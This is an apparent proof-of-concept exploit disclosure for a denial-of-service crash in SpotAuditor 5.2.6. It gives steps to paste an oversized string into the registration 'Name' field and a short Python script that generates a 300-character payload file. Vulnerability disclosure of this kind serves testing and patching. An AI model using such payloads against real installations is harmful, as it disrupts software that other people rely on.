@@ -1,0 +1,23 @@
+#Exploit Title: SpotAuditor 5.2.6 - 'Name' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-04-27
+#Vendor Homepage: www.nsauditor.com 
+#Software Link: http://spotauditor.nsauditor.com/downloads/spotauditor_setup.exe
+#Tested Version: 5.2.6
+#Tested on: Windows Windows 10 Single Language x64 / 7 x64 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: Spotauditor_name_5.2.6.py
+#2.- Open Spotauditor_name.txt and copy content to clipboard
+#3.- Open SpotAuditor
+#4.- Select "Register" > "Enter Registration Code..."
+#5.- In "Name" paste Clipboard
+#6.- In Key type "test"
+#7.- Click "Ok"
+#8.- Crarshed
+ 
+cod = "\x41" * 300
+ 
+f = open('Spotauditor_name.txt', 'w')
+f.write(cod)
+f.close()
